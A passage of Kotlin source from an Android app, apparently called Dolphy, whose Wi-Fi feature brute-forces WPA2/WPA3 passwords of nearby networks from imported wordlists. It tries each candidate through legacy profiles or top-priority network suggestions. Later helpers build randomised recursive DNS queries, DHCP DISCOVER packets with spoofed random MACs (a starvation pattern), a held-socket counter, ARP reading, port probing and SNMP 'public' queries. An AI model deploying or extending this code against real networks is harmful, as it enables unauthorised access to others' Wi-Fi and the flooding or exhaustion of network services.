            onImport = { fileImportLauncher.launch(arrayOf("text/plain", "application/octet-stream")) },
            onDeleteRequest = { group ->
                if (bruteForceJob?.isActive == true) {
                    wordlistFeedback = "Hentikan brute force sebelum menghapus wordlist."
                } else {
                    pendingWordlistDeletion = group
                }
            },
            onDismiss = { showPasswordDialog = false },
            onSave = { saveGroups(passwordGroups) },
        )
    }

    pendingWordlistDeletion?.let { group ->
        AlertDialog(
            onDismissRequest = { if (!deletingWordlist) pendingWordlistDeletion = null },
            title = { Text("Hapus wordlist?") },
            text = {
                Text("${group.name} akan dihapus dari aplikasi. Tindakan ini tidak dapat dibatalkan.")
            },
            confirmButton = {
                com.droid.dolphy.AccentButton(
                    onClick = {
                        scope.launch {
                            deletingWordlist = true
                            try {
                                group.sourceFile?.let { sourceFile ->
                                    withContext(Dispatchers.IO) {
                                        WordlistStore.delete(context, sourceFile)
                                    }
                                }
                                passwordGroups.remove(group)
                                saveGroups(passwordGroups)
                                wordlistFeedback = "${group.name} dihapus"
                                pendingWordlistDeletion = null
                            } catch (e: CancellationException) {
                                throw e
                            } catch (e: Exception) {
                                wordlistFeedback = "Gagal menghapus: ${e.message ?: e.javaClass.simpleName}"
                            } finally {
                                deletingWordlist = false
                            }
                        }
                    },
                    enabled = !deletingWordlist,
                ) {
                    if (deletingWordlist) {
                        CircularProgressIndicator(modifier = Modifier.size(18.dp), strokeWidth = 2.dp)
                    } else {
                        Text("Hapus")
                    }
                }
            },
            dismissButton = {
                com.droid.dolphy.DolphyTextButton(
                    onClick = { pendingWordlistDeletion = null },
                    enabled = !deletingWordlist,
                ) {
                    Text(stringResource(R.string.cancel))
                }
            },
        )
    }
}

private enum class WifiAttemptOutcome {
    SUCCESS,
    REJECTED,
    INCONCLUSIVE,
    UNSUPPORTED,
    ERROR,
}

private data class WifiAttemptResult(
    val outcome: WifiAttemptOutcome,
    val detail: String,
)

private fun currentCompletedWifiSsid(wifiManager: WifiManager): String? {
    return try {
        val info = wifiManager.connectionInfo ?: return null
        if (info.supplicantState != SupplicantState.COMPLETED) return null
        val raw = info.ssid?.trim('"').orEmpty()
        if (raw.isEmpty() || raw == "<unknown ssid>") null else raw
    } catch (_: Exception) {
        null
    }
}

private fun isFullyConnectedToSsid(wifiManager: WifiManager, cleanSsid: String): Boolean {
    return try {
        val info = wifiManager.connectionInfo ?: return false
        val ssid = info.ssid?.trim('"').orEmpty()
        if (ssid.isEmpty() || ssid == "<unknown ssid>" || ssid != cleanSsid) return false
        info.supplicantState == SupplicantState.COMPLETED
    } catch (_: Exception) {
        false
    }
}

private fun isBusyOnSsid(wifiManager: WifiManager, cleanSsid: String): Boolean {
    return try {
        val info = wifiManager.connectionInfo ?: return false
        val ssid = info.ssid?.trim('"').orEmpty()
        if (ssid != cleanSsid) return false
        when (info.supplicantState) {
            SupplicantState.COMPLETED,
            SupplicantState.ASSOCIATED,
            SupplicantState.ASSOCIATING,
            SupplicantState.AUTHENTICATING,
            SupplicantState.FOUR_WAY_HANDSHAKE,
            SupplicantState.GROUP_HANDSHAKE,
            -> true
            else -> false
        }
    } catch (_: Exception) {
        false
    }
}

@androidx.annotation.RequiresApi(Build.VERSION_CODES.Q)
private fun removeWifiSuggestions(wifiManager: WifiManager, suggestions: List<WifiNetworkSuggestion>) {
    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return
    runCatching {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            wifiManager.removeNetworkSuggestions(
                suggestions,
                WifiManager.ACTION_REMOVE_SUGGESTION_DISCONNECT,
            )
        } else {
            wifiManager.removeNetworkSuggestions(suggestions)
        }
    }
}

private fun clearAppWifiSuggestions(wifiManager: WifiManager) {
    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return
    removeWifiSuggestions(wifiManager, emptyList())
}

private fun waitForNoCompletedConnection(wifiManager: WifiManager, timeoutMs: Long) {
    val deadline = System.currentTimeMillis() + timeoutMs
    while (System.currentTimeMillis() < deadline) {
        if (currentCompletedWifiSsid(wifiManager) == null) return
        Thread.sleep(200)
    }
}

private fun prepareRadioForBrute(wifiManager: WifiManager, cleanSsid: String) {
    clearAppWifiSuggestions(wifiManager)
    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
        @Suppress("DEPRECATION")
        runCatching { wifiManager.disconnect() }
        waitUntilLeftTarget(wifiManager, cleanSsid, timeoutMs = 8_000)
    } else {
        // disconnect() always returns false for apps targeting Android 10+.
        // Removing our own suggestion with DISCONNECT is the only public cleanup
        // available here; a saved Wi-Fi connection requires user action.
        waitForNoCompletedConnection(wifiManager, timeoutMs = 3_000)
    }
    Thread.sleep(500)
}

private fun settleAfterFailedAttempt(wifiManager: WifiManager, cleanSsid: String) {
    clearAppWifiSuggestions(wifiManager)
    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
        @Suppress("DEPRECATION")
        runCatching { wifiManager.disconnect() }
        waitUntilLeftTarget(wifiManager, cleanSsid, timeoutMs = 8_000)
        Thread.sleep(800)
    } else {
        waitForNoCompletedConnection(wifiManager, timeoutMs = 1_500)
        Thread.sleep(400)
    }
}

private fun waitUntilLeftTarget(wifiManager: WifiManager, cleanSsid: String, timeoutMs: Long) {
    val deadline = System.currentTimeMillis() + timeoutMs
    while (System.currentTimeMillis() < deadline) {
        if (!isBusyOnSsid(wifiManager, cleanSsid) && !isFullyConnectedToSsid(wifiManager, cleanSsid)) {
            Thread.sleep(300)
            if (!isBusyOnSsid(wifiManager, cleanSsid)) return
        }
        Thread.sleep(250)
    }
}

private fun testWifiPassword(
    context: Context,
    wifiManager: WifiManager,
    network: HubWifiNetwork,
    password: String,
): WifiAttemptResult {
    val cleanSsid = network.ssid
    if (isBusyOnSsid(wifiManager, cleanSsid)) {
        settleAfterFailedAttempt(wifiManager, cleanSsid)
    }
    val activeSsid = currentCompletedWifiSsid(wifiManager)
    if (activeSsid != null) {
        return WifiAttemptResult(
            WifiAttemptOutcome.INCONCLUSIVE,
            "Wi-Fi $activeSsid is still connected; Android did not isolate the candidate",
        )
    }
    return when {
        Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q ->
            testPasswordViaSuggestion(context, wifiManager, network, password)
        else ->
            testPasswordLegacy(wifiManager, network, password)
    }
}

private fun testPasswordLegacy(
    wifiManager: WifiManager,
    network: HubWifiNetwork,
    password: String,
): WifiAttemptResult {
    if (detectWifiPersonalSecurity(network.capabilities) != WifiPersonalSecurity.WPA2) {
        return WifiAttemptResult(
            WifiAttemptOutcome.UNSUPPORTED,
            "Only WPA2-PSK is supported by the legacy Android profile API",
        )
    }
    val cleanSsid = network.ssid
    var netId = -1
    var success = false
    return try {
        @Suppress("DEPRECATION")
        val wifiConfig = android.net.wifi.WifiConfiguration().apply {
            SSID = quoteLegacyWifiValue(cleanSsid)
            preSharedKey = legacyWifiPskValue(password)
            BSSID = network.bssid
            allowedAuthAlgorithms.set(android.net.wifi.WifiConfiguration.AuthAlgorithm.OPEN)
            allowedKeyManagement.set(android.net.wifi.WifiConfiguration.KeyMgmt.WPA_PSK)
            allowedProtocols.set(android.net.wifi.WifiConfiguration.Protocol.WPA)
            allowedProtocols.set(android.net.wifi.WifiConfiguration.Protocol.RSN)
            allowedPairwiseCiphers.set(android.net.wifi.WifiConfiguration.PairwiseCipher.TKIP)
            allowedPairwiseCiphers.set(android.net.wifi.WifiConfiguration.PairwiseCipher.CCMP)
            allowedGroupCiphers.set(android.net.wifi.WifiConfiguration.GroupCipher.TKIP)
            allowedGroupCiphers.set(android.net.wifi.WifiConfiguration.GroupCipher.CCMP)
            status = android.net.wifi.WifiConfiguration.Status.ENABLED
        }
        @Suppress("DEPRECATION")
        netId = wifiManager.addNetwork(wifiConfig)
        if (netId == -1) {
            return WifiAttemptResult(WifiAttemptOutcome.ERROR, "Android rejected the legacy Wi-Fi profile")
        }
        @Suppress("DEPRECATION")
        wifiManager.disconnect()
        Thread.sleep(400)
        @Suppress("DEPRECATION")
        if (!wifiManager.enableNetwork(netId, true)) {
            return WifiAttemptResult(WifiAttemptOutcome.ERROR, "Android could not enable the test profile")
        }
        @Suppress("DEPRECATION")
        wifiManager.reconnect()
        val deadline = System.currentTimeMillis() + 18_000
        var stableSince = -1L
        while (System.currentTimeMillis() < deadline) {
            val info = wifiManager.connectionInfo
            val good = info != null &&
                info.networkId == netId &&
                info.ssid?.trim('"') == cleanSsid &&
                info.supplicantState == SupplicantState.COMPLETED
            if (good) {
                if (stableSince < 0) stableSince = System.currentTimeMillis()
                if (System.currentTimeMillis() - stableSince >= 1_500) {
                    success = true
                    return WifiAttemptResult(WifiAttemptOutcome.SUCCESS, "Legacy profile connected")
                }
            } else {
                stableSince = -1L
            }
            Thread.sleep(250)
        }
        WifiAttemptResult(
            WifiAttemptOutcome.INCONCLUSIVE,
            "The forced legacy profile did not reach a stable connection within 18 seconds",
        )
    } catch (e: Exception) {
        WifiAttemptResult(WifiAttemptOutcome.ERROR, e.message ?: e.javaClass.simpleName)
    } finally {
        if (netId != -1 && !success) {
            runCatching {
                @Suppress("DEPRECATION")
                wifiManager.removeNetwork(netId)
                @Suppress("DEPRECATION")
                wifiManager.saveConfiguration()
            }
            @Suppress("DEPRECATION")
            runCatching { wifiManager.disconnect() }
        }
    }
}

@androidx.annotation.RequiresApi(Build.VERSION_CODES.R)
private fun registerSuggestionFailureListener(
    context: Context,
    wifiManager: WifiManager,
    attemptSuggestion: WifiNetworkSuggestion,
    failureReason: java.util.concurrent.atomic.AtomicReference<Int?>,
): WifiManager.SuggestionConnectionStatusListener? {
    val listener = WifiManager.SuggestionConnectionStatusListener { failedSuggestion, reason ->
        if (failedSuggestion == attemptSuggestion) failureReason.set(reason)
    }
    return runCatching {
        wifiManager.addSuggestionConnectionStatusListener(
            ContextCompat.getMainExecutor(context),
            listener,
        )
        listener
    }.getOrNull()
}

@androidx.annotation.RequiresApi(Build.VERSION_CODES.R)
private fun unregisterSuggestionFailureListener(wifiManager: WifiManager, listener: Any?) {
    val typedListener = listener as? WifiManager.SuggestionConnectionStatusListener ?: return
    runCatching { wifiManager.removeSuggestionConnectionStatusListener(typedListener) }
}

@androidx.annotation.RequiresApi(Build.VERSION_CODES.Q)
private fun testPasswordViaSuggestion(
    context: Context,
    wifiManager: WifiManager,
    network: HubWifiNetwork,
    password: String,
): WifiAttemptResult {
    val cleanSsid = network.ssid
    val security = detectWifiPersonalSecurity(network.capabilities)
    if (security == WifiPersonalSecurity.UNSUPPORTED) {
        return WifiAttemptResult(WifiAttemptOutcome.UNSUPPORTED, "Unsupported Wi-Fi security mode")
    }
    if (security == WifiPersonalSecurity.WPA3 && Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
        return WifiAttemptResult(WifiAttemptOutcome.UNSUPPORTED, "WPA3-SAE requires Android 11+")
    }

    var suggestion: WifiNetworkSuggestion? = null
    var receiver: android.content.BroadcastReceiver? = null
    var receiverRegistered = false
    var connectionListener: Any? = null
    var listenerRegistered = false
    var success = false
    val connected = java.util.concurrent.atomic.AtomicBoolean(false)
    val failureReason = java.util.concurrent.atomic.AtomicReference<Int?>(null)

    return try {
        clearAppWifiSuggestions(wifiManager)
        Thread.sleep(300)
        val activeSsid = currentCompletedWifiSsid(wifiManager)
        if (activeSsid != null) {
            return WifiAttemptResult(
                WifiAttemptOutcome.INCONCLUSIVE,
                "Wi-Fi $activeSsid is still connected; disconnect it in system settings",
            )
        }

        val builder = WifiNetworkSuggestion.Builder()
            .setSsid(cleanSsid)
            // Required to receive ACTION_WIFI_NETWORK_SUGGESTION_POST_CONNECTION.
            // Without that directed broadcast, a real connection is only a timeout
            // to this app and cannot be tied back to the exact candidate safely.
            .setIsAppInteractionRequired(true)
        network.bssid?.let { bssid ->
            runCatching { builder.setBssid(android.net.MacAddress.fromString(bssid)) }
        }
        when (security) {
            WifiPersonalSecurity.WPA2 -> builder.setWpa2Passphrase(password)
            WifiPersonalSecurity.WPA3 -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    builder.setWpa3Passphrase(password)
                }
            }
            WifiPersonalSecurity.UNSUPPORTED -> Unit
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            builder.setPriority(Int.MAX_VALUE)
        }
        val attemptSuggestion = builder.build()
        suggestion = attemptSuggestion

        val attemptReceiver = object : android.content.BroadcastReceiver() {
            override fun onReceive(receiverContext: Context?, intent: Intent?) {
                if (intent?.action != WifiManager.ACTION_WIFI_NETWORK_SUGGESTION_POST_CONNECTION) return
                val connectedSuggestion: WifiNetworkSuggestion? = if (Build.VERSION.SDK_INT >= 33) {
                    intent.getParcelableExtra(
                        WifiManager.EXTRA_NETWORK_SUGGESTION,
                        WifiNetworkSuggestion::class.java,
                    )
                } else {
                    @Suppress("DEPRECATION")
                    intent.getParcelableExtra(WifiManager.EXTRA_NETWORK_SUGGESTION)
                }
                val passphraseMatches = Build.VERSION.SDK_INT < Build.VERSION_CODES.R ||
                    connectedSuggestion?.passphrase == password
                if (connectedSuggestion == attemptSuggestion && passphraseMatches) {
                    connected.set(true)
                }
            }
        }
        receiver = attemptReceiver
        ContextCompat.registerReceiver(
            context,
            attemptReceiver,
            android.content.IntentFilter(WifiManager.ACTION_WIFI_NETWORK_SUGGESTION_POST_CONNECTION),
            ContextCompat.RECEIVER_NOT_EXPORTED,
        )
        receiverRegistered = true

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            connectionListener = registerSuggestionFailureListener(
                context = context,
                wifiManager = wifiManager,
                attemptSuggestion = attemptSuggestion,
                failureReason = failureReason,
            )
            listenerRegistered = connectionListener != null
        }

        val addStatus = wifiManager.addNetworkSuggestions(listOf(attemptSuggestion))
        if (addStatus != WifiManager.STATUS_NETWORK_SUGGESTIONS_SUCCESS) {
            return WifiAttemptResult(
                WifiAttemptOutcome.INCONCLUSIVE,
                "Android did not accept the suggestion (status $addStatus); check Dolphy approval",
            )
        }
        @Suppress("DEPRECATION")
        runCatching { wifiManager.startScan() }

        val deadline = System.currentTimeMillis() + 20_000
        while (System.currentTimeMillis() < deadline) {
            if (connected.get()) {
                success = true
                return WifiAttemptResult(
                    WifiAttemptOutcome.SUCCESS,
                    "Android confirmed the exact suggestion connection",
                )
            }
            failureReason.get()?.let { reason ->
                return when (reason) {
                    WifiManager.STATUS_SUGGESTION_CONNECTION_FAILURE_AUTHENTICATION ->
                        WifiAttemptResult(
                            WifiAttemptOutcome.REJECTED,
                            "Android reported authentication failure",
                        )
                    WifiManager.STATUS_SUGGESTION_CONNECTION_FAILURE_ASSOCIATION ->
                        WifiAttemptResult(
                            WifiAttemptOutcome.INCONCLUSIVE,
                            "Association failed; check signal, band, BSSID, and security mode",
                        )
                    WifiManager.STATUS_SUGGESTION_CONNECTION_FAILURE_IP_PROVISIONING ->
                        WifiAttemptResult(
                            WifiAttemptOutcome.INCONCLUSIVE,
                            "IP/DHCP provisioning failed; this is not proof of a wrong password",
                        )
                    else ->
                        WifiAttemptResult(
                            WifiAttemptOutcome.INCONCLUSIVE,
                            "Android reported an unknown suggestion connection failure",
                        )
                }
            }
            Thread.sleep(200)
        }
        WifiAttemptResult(
            WifiAttemptOutcome.INCONCLUSIVE,
            "No exact suggestion confirmation within 20 seconds; timeout is not a wrong-password result",
        )
    } catch (e: Exception) {
        WifiAttemptResult(WifiAttemptOutcome.ERROR, e.message ?: e.javaClass.simpleName)
    } finally {
        if (listenerRegistered && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            unregisterSuggestionFailureListener(wifiManager, connectionListener)
        }
        if (receiverRegistered) {
            receiver?.let { runCatching { context.unregisterReceiver(it) } }
        }
        if (!success) {
            suggestion?.let { removeWifiSuggestions(wifiManager, listOf(it)) }
        }
    }
}

@Composable
private fun BrutePasswordDialog(
    passwordGroups: MutableList<PasswordGroup>,
    isImporting: Boolean,
    isBusy: Boolean,
    feedback: String?,
    onImport: () -> Unit,
    onDeleteRequest: (PasswordGroup) -> Unit,
    onDismiss: () -> Unit,
    onSave: () -> Unit,
) {
    val performanceMode = com.droid.dolphy.LocalPerformanceModeEnabled.current
    val dialogVisible = remember { MutableTransitionState(false) }
    LaunchedEffect(Unit) { dialogVisible.targetState = true }

    Dialog(
        onDismissRequest = onDismiss,
        properties = DialogProperties(dismissOnClickOutside = true)
    ) {
        AnimatedVisibility(
            visibleState = dialogVisible,
            enter = if (performanceMode) {
                EnterTransition.None
            } else {
                fadeIn(animationSpec = tween(150)) +
                    scaleIn(
                        initialScale = 0.94f,
                        animationSpec = spring(dampingRatio = 0.78f, stiffness = 480f),
                    )
            },
            exit = ExitTransition.None,
        ) {
        Surface(
            modifier = Modifier
                .fillMaxWidth()
                .heightIn(max = 700.dp),
            shape = RoundedCornerShape(28.dp),
            color = MaterialTheme.colorScheme.surfaceContainerHighest,
            tonalElevation = 8.dp
        ) {
            Column(
                modifier = Modifier
                    .verticalScroll(rememberScrollState())
                    .padding(20.dp),
                verticalArrangement = Arrangement.spacedBy(12.dp)
            ) {
                Text(
                    text = stringResource(R.string.wifi_brute_force_passwords),
                    style = MaterialTheme.typography.headlineSmall,
                    fontWeight = FontWeight.Bold,
                    modifier = Modifier.fillMaxWidth(),
                )

                Text(
                    text = stringResource(R.string.wifi_brute_force_desc),
                    style = MaterialTheme.typography.bodySmall,
                    color = MaterialTheme.colorScheme.onSurfaceVariant
                )
                com.droid.dolphy.AccentButton(
                    onClick = onImport,
                    enabled = !isImporting && !isBusy,
                    modifier = Modifier.fillMaxWidth(),
                ) {
                    if (isImporting) {
                        CircularProgressIndicator(
                            modifier = Modifier.size(20.dp),
                            strokeWidth = 2.dp,
                            color = MaterialTheme.colorScheme.onPrimary,
                        )
                    } else {
                        Icon(
                            Icons.Filled.Add,
                            contentDescription = null,
                        )
                    }
                    Spacer(Modifier.width(8.dp))
                    Text(
                        text = if (isImporting) "Mengimpor wordlist…" else "Impor wordlist .txt",
                        fontWeight = FontWeight.Bold,
                    )
                }
                Text(
                    text = "Satu sandi per baris · spasi dipertahankan · disimpan privat",
                    style = MaterialTheme.typography.labelSmall,
                    color = MaterialTheme.colorScheme.onSurfaceVariant,
                )
                AnimatedContent(
                    targetState = feedback,
                    transitionSpec = {
                        if (performanceMode) {
                            EnterTransition.None togetherWith ExitTransition.None
                        } else {
                            (fadeIn(animationSpec = tween(150)) +
                                slideInVertically(animationSpec = tween(180)) { it / 3 }) togetherWith
                                (fadeOut(animationSpec = tween(100)) +
                                    slideOutVertically(animationSpec = tween(120)) { -it / 3 })
                        }
                    },
                    label = "wordlist_feedback",
                ) { message ->
                    if (message != null) {
                        Text(
                            text = message,
                            style = MaterialTheme.typography.bodySmall,
                            color = if (message.startsWith("Impor gagal") || message.startsWith("Gagal")) {
                                MaterialTheme.colorScheme.error
                            } else {
                                MaterialTheme.colorScheme.primary
                            },
                        )
                    }
                }

                Surface(
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(240.dp),
                    shape = RoundedCornerShape(12.dp),
                    color = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)
                ) {
                    LazyColumn(
                        modifier = Modifier.padding(vertical = 4.dp),
                        contentPadding = PaddingValues(4.dp),
                        verticalArrangement = Arrangement.spacedBy(4.dp)
                    ) {
                        itemsIndexed(
                            passwordGroups,
                            key = { index, group -> group.sourceFile ?: "legacy-${group.name}-$index" },
                        ) { _, group ->
                            MaterialCard(
                                modifier = Modifier.fillMaxWidth(),
                                accentColor = if (group.selected) {
                                    MaterialTheme.colorScheme.primary
                                } else {
                                    MaterialTheme.colorScheme.onSurface.copy(alpha = 0.3f)
                                },
                                cornerRadius = 12.dp,
                                contentPadding = 0.dp,
                            ) {
                                Row(
                                    modifier = Modifier
                                        .fillMaxWidth()
                                        .padding(horizontal = 8.dp, vertical = 6.dp),
                                    verticalAlignment = Alignment.CenterVertically,
                                    horizontalArrangement = Arrangement.spacedBy(8.dp),
                                ) {
                                    Checkbox(
                                        checked = group.selected,
                                        onCheckedChange = {
                                            group.selected = it
                                            onSave()
                                        },
                                    )
                                    Column(modifier = Modifier.weight(1f)) {
                                        Text(
                                            text = group.name,
                                            style = MaterialTheme.typography.titleMedium,
                                            fontWeight = FontWeight.Bold,
                                            color = MaterialTheme.colorScheme.onSurface,
                                        )
                                        Text(
                                            text = stringResource(
                                                R.string.wifi_passwords_count,
                                                group.count,
                                                group.validCount,
                                            ),
                                            style = MaterialTheme.typography.bodySmall,
                                            color = MaterialTheme.colorScheme.onSurfaceVariant,
                                        )
                                        if (group.isImported) {
                                            Text(
                                                text = if (group.sourceFile == null) "impor lama" else "file .txt",
                                                style = MaterialTheme.typography.labelSmall,
                                                color = MaterialTheme.colorScheme.primary,
                                            )
                                        }
                                    }
                                    if (group.isImported) {
                                        DolphyIconButton(
                                            onClick = { onDeleteRequest(group) },
                                            enabled = !isBusy && !isImporting,
                                        ) {
                                            Icon(
                                                Icons.Default.Delete,
                                                contentDescription = "Hapus ${group.name}",
                                                tint = MaterialTheme.colorScheme.error,
                                            )
                                        }
                                    }
                                }
                            }
                        }
                    }
                }

                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.End
                ) {
                    com.droid.dolphy.AccentButton(onClick = onDismiss) {
                        Text(stringResource(R.string.cd_close))
                    }
                }
            }
        }
        }
    }
}


private fun dhcpIntToIpv4(value: Int): String? {
    if (value == 0) return null
    return try {
        val bytes = ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt(value).array()
        InetAddress.getByAddress(bytes).hostAddress
    } catch (_: Exception) {
        null
    }
}

private fun getHubLocalIpv4(): String? {
    return try {
        val interfaces = Collections.list(NetworkInterface.getNetworkInterfaces())
        for (intf in interfaces) {
            if (!intf.isUp || intf.isLoopback) continue
            for (addr in Collections.list(intf.inetAddresses)) {
                if (addr.isLoopbackAddress) continue
                val host = addr.hostAddress ?: continue
                if (host.contains(':')) continue
                return host
            }
        }
        null
    } catch (_: Exception) {
        null
    }
}

private fun readArpTable(): List<Pair<String, String>> {
    val out = mutableListOf<Pair<String, String>>()
    try {
        BufferedReader(FileReader("/proc/net/arp")).use { reader ->
            reader.readLine()
            var line = reader.readLine()
            while (line != null) {
                val parts = line.trim().split(Regex("\\s+"))
                if (parts.size >= 4) {
                    val ip = parts[0]
                    val mac = parts[3].uppercase(Locale.US)
                    if (mac.matches(Regex("^([0-9A-F]{2}:){5}[0-9A-F]{2}$")) && mac != "00:00:00:00:00:00") {
                        out += ip to mac
                    }
                }
                line = reader.readLine()
            }
        }
    } catch (_: Exception) {
    }
    return out
}

private fun quickPortOpen(ip: String, port: Int, timeoutMs: Int): Boolean {
    return runCatching {
        Socket().use { s ->
            s.connect(InetSocketAddress(ip, port), timeoutMs)
            true
        }
    }.getOrDefault(false)
}


private fun buildDnsQuery(hostname: String, id: Int = (System.nanoTime() and 0xFFFF).toInt()): ByteArray {
    val header = ByteBuffer.allocate(12).order(ByteOrder.BIG_ENDIAN)
    header.putShort((id and 0xFFFF).toShort())
    header.putShort(0x0100.toShort())
    header.putShort(1)
    header.putShort(0)
    header.putShort(0)
    header.putShort(0)
    val qname = java.io.ByteArrayOutputStream()
    hostname.split('.').forEach { label ->
        if (label.isEmpty()) return@forEach
        val bytes = label.toByteArray(Charsets.US_ASCII).take(63).toByteArray()
        qname.write(bytes.size)
        qname.write(bytes)
    }
    qname.write(0)
    val tail = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN)
    val qtype = if ((id and 1) == 0) 1 else 28
    tail.putShort(qtype.toShort())
    tail.putShort(1)
    return header.array() + qname.toByteArray() + tail.array()
}


private fun buildRandomRecursiveDnsQuery(random: java.util.Random): ByteArray {
    val id = random.nextInt(0x10000)
    val label = buildString(16) {
        repeat(10 + random.nextInt(6)) {
            append(('a'.code + random.nextInt(26)).toChar())
        }
    }
    val num = random.nextInt(1_000_000)
    val roots = arrayOf(
        "com", "net", "org", "ru", "io", "info", "xyz", "online",
        "google.com", "cloudflare.com", "amazon.com", "microsoft.com",
        "yandex.ru", "vk.com", "apple.com",
    )
    val root = roots[random.nextInt(roots.size)]
    val host = when (random.nextInt(4)) {
        0 -> "$label$num.$root"
        1 -> "$label.$num.$root"
        2 -> "cdn-$label-$num.$root"
        else -> "r$num-$label.$root"
    }
    return buildDnsQuery(host, id)
}


private fun buildDhcpDiscover(): ByteArray {
    val buf = ByteArray(300)
    buf[0] = 1
    buf[1] = 1
    buf[2] = 6
    val xid = (System.nanoTime() and 0xFFFFFFFFL).toInt()
    buf[4] = (xid ushr 24).toByte()
    buf[5] = (xid ushr 16).toByte()
    buf[6] = (xid ushr 8).toByte()
    buf[7] = xid.toByte()
    buf[10] = 0x80.toByte()
    val rnd = java.util.Random()
    for (i in 0 until 6) buf[28 + i] = rnd.nextInt(256).toByte()
    buf[28] = ((buf[28].toInt() and 0xFE) or 0x02).toByte()
    buf[236] = 99
    buf[237] = 130.toByte()
    buf[238] = 83
    buf[239] = 99
    buf[240] = 53
    buf[241] = 1
    buf[242] = 1
    buf[243] = 55
    buf[244] = 4
    buf[245] = 1
    buf[246] = 3
    buf[247] = 6
    buf[248] = 15
    buf[249] = 255.toByte()
    return buf
}

private const val MAX_HELD_FDS = 700
private val heldFdCount = AtomicInteger(0)

private fun tryAcquireFd(): Boolean {
    while (true) {
        val current = heldFdCount.get()
        if (current >= MAX_HELD_FDS) return false
        if (heldFdCount.compareAndSet(current, current + 1)) return true
    }
}

private fun releaseFd() {
    heldFdCount.updateAndGet { maxOf(0, it - 1) }
}

private fun buildSsdpMsearch(st: String = "ssdp:all"): ByteArray {
    return ("M-SEARCH * HTTP/1.1\r\n" +
        "HOST: 239.255.255.250:1900\r\n" +
        "MAN: \"ssdp:discover\"\r\n" +
        "MX: 2\r\n" +
        "ST: $st\r\n\r\n").toByteArray(Charsets.US_ASCII)
}

private fun buildMdnsServiceQuery(id: Int): ByteArray {
    val header = ByteBuffer.allocate(12).order(ByteOrder.BIG_ENDIAN)
    header.putShort((id and 0xFFFF).toShort())
    header.putShort(0)
    header.putShort(1)
    header.putShort(0)
    header.putShort(0)
    header.putShort(0)
    val qname = byteArrayOf(
        9, '_'.code.toByte(), 's'.code.toByte(), 'e'.code.toByte(), 'r'.code.toByte(),
        'v'.code.toByte(), 'i'.code.toByte(), 'c'.code.toByte(), 'e'.code.toByte(),
        's'.code.toByte(),
        7, '_'.code.toByte(), 'd'.code.toByte(), 'n'.code.toByte(), 's'.code.toByte(),
        '-'.code.toByte(), 's'.code.toByte(), 'd'.code.toByte(),
        4, '_'.code.toByte(), 'u'.code.toByte(), 'd'.code.toByte(), 'p'.code.toByte(),
        5, 'l'.code.toByte(), 'o'.code.toByte(), 'c'.code.toByte(), 'a'.code.toByte(),
        'l'.code.toByte(),
        0,
    )
    val tail = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN)
    tail.putShort(12)
    tail.putShort(1)
    return header.array() + qname + tail.array()
}

private fun buildSnmpGetNext(requestId: Int): ByteArray {
    return byteArrayOf(
        0x30.toByte(), 0x26.toByte(),
        0x02, 0x01, 0x01,
        0x04, 0x06, 0x70, 0x75, 0x62, 0x6C, 0x69, 0x63,
        0xA1.toByte(), 0x19.toByte(),
        0x02, 0x04,
        (requestId ushr 24).toByte(), (requestId ushr 16).toByte(),
        (requestId ushr 8).toByte(), requestId.toByte(),
        0x02, 0x01, 0x00,
        0x02, 0x01, 0x00,
        0x30, 0x0B,
        0x30, 0x09,
        0x06, 0x07, 0x2B, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01,
        0x05, 0x00,
    )
}

